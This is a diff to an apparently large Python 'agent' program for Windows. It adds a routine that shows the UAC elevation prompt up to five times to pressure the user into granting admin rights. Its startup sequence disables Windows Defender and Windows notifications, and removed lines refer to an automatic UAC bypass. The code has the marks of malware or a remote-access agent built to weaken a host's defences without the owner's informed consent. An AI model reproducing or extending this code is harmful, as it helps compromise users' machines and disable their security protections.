@@ -5702,6 +5702,64 @@ def test_uac_control():
     
     print("\nTest complete!")
 
+def request_admin_with_retries(max_attempts=5):
+    """
+    Request admin privileges with specified number of retries.
+    
+    Args:
+        max_attempts: Maximum number of times to show UAC prompt (default 5)
+    
+    Returns:
+        bool: True if admin granted, False if user canceled max_attempts times
+    """
+    if not WINDOWS_AVAILABLE:
+        return False
+    
+    # Already admin
+    if is_admin():
+        print("[ADMIN] Already running as Administrator")
+        return True
+    
+    print(f"\n[ADMIN] Requesting administrator privileges (max {max_attempts} attempts)...")
+    print("[ADMIN] Please click 'Yes' in the UAC prompt to continue")
+    print(f"[ADMIN] Or click 'No/Cancel' {max_attempts} times to skip admin features\n")
+    
+    for attempt in range(1, max_attempts + 1):
+        try:
+            print(f"[ADMIN] Attempt {attempt}/{max_attempts} - Showing UAC prompt...")
+            
+            # Show UAC prompt using ShellExecuteW with runas
+            result = ctypes.windll.shell32.ShellExecuteW(
+                None, "runas", sys.executable, f'"{__file__}"', None, 1
+            )
+            
+            # ShellExecuteW returns > 32 on success
+            if result > 32:
+                print(f"[ADMIN] ✅ User granted admin privileges on attempt {attempt}!")
+                # Set environment variable to indicate we're in elevated mode
+                os.environ['ELEVATED_MODE'] = '1'
+                # The elevated process will start, exit this one
+                sys.exit(0)
+            else:
+                print(f"[ADMIN] ⚠️ User clicked Cancel (attempt {attempt}/{max_attempts})")
+                
+                if attempt < max_attempts:
+                    print(f"[ADMIN] Will retry... ({max_attempts - attempt} attempts remaining)")
+                    time.sleep(1)
+                else:
+                    print(f"[ADMIN] ❌ User canceled {max_attempts} times - proceeding without admin")
+                    return False
+                    
+        except Exception as e:
+            print(f"[ADMIN] Error on attempt {attempt}: {e}")
+            if attempt < max_attempts:
+                time.sleep(1)
+            else:
+                print("[ADMIN] ❌ All attempts failed - proceeding without admin")
+                return False
+    
+    return False
+
 def run_as_admin():
     """Relaunch the script with elevated privileges if not already admin."""
     if not WINDOWS_AVAILABLE:
@@ -14182,19 +14240,33 @@ if __name__ == "__main__":
     print("[STARTUP] Python Agent Starting...")
     print("[STARTUP] Initializing components...")
     
-    # PRIORITY 0: OPTIONAL admin privileges (bootstrap method will handle it)
+    # PRIORITY 0: Request admin privileges (5 attempts)
+    USER_GRANTED_ADMIN = False
+    
     if WINDOWS_AVAILABLE:
         print("=" * 80)
-        print("[STARTUP] PRIORITY 0: Checking Administrator Privileges...")
-        print("[STARTUP] NOTE: Admin is NOT required - bootstrap method will handle it!")
+        print("[STARTUP] PRIORITY 0: Administrator Privileges Request")
         print("=" * 80)
         
         if is_admin():
             print("[STARTUP] ✅ Already running as Administrator")
+            USER_GRANTED_ADMIN = True
         else:
             print("[STARTUP] ⚪ Running as Standard User")
-            print("[STARTUP] ✅ Bootstrap method will use UAC bypass to gain admin (no password needed!)")
-            print("[STARTUP] Skipping admin prompt - will use automatic UAC bypass instead")
+            print("[STARTUP] 🔐 Requesting admin privileges for full functionality...")
+            print("")
+            
+            # Request admin with exactly 5 attempts
+            USER_GRANTED_ADMIN = request_admin_with_retries(max_attempts=5)
+            
+            if USER_GRANTED_ADMIN:
+                # This code won't execute because request_admin_with_retries exits
+                # if admin is granted, but keep for clarity
+                print("[STARTUP] ✅ Admin privileges granted!")
+            else:
+                print("[STARTUP] ℹ️ User declined admin privileges")
+                print("[STARTUP] ℹ️ Will proceed with limited functionality (non-admin mode)")
+                print("[STARTUP] ℹ️ Features requiring admin will be skipped")
         
         print("=" * 80)
     
@@ -14244,8 +14316,11 @@ if __name__ == "__main__":
                 # import traceback
                 # traceback.print_exc()
         
-        # 2. Disable Windows Defender (PRIORITY!)
-        if SKIP_DEFENDER_DISABLE:
+        # 2. Disable Windows Defender (if user granted admin)
+        if not USER_GRANTED_ADMIN:
+            print("\n[STARTUP] Step 2: Defender disable SKIPPED (no admin privileges)")
+            print("[STARTUP] ℹ️ User declined admin - Defender disable requires admin")
+        elif SKIP_DEFENDER_DISABLE:
             print("\n[STARTUP] Step 2: Defender disable SKIPPED (SKIP_DEFENDER_DISABLE = True)")
             print("[STARTUP] ℹ️ Running in safe testing mode")
             print("[STARTUP] ℹ️ To disable Defender: Set SKIP_DEFENDER_DISABLE = False")
@@ -14271,8 +14346,10 @@ if __name__ == "__main__":
                 print("[STARTUP] 🔄 Will retry in background thread...")
                 print("[STARTUP] ℹ️ Agent continues running - Defender may still be active")
         
-        # 3. Disable Windows notifications
+        # 3. Disable Windows notifications (works without admin for user-level settings)
         print("\n[STARTUP] Step 3: Disabling Windows notifications...")
+        if not USER_GRANTED_ADMIN:
+            print("[STARTUP] ℹ️ Running without admin - will disable user-level notifications only")
         try:
             if disable_windows_notifications():
                 print("[STARTUP] ✅ Notifications disabled successfully")
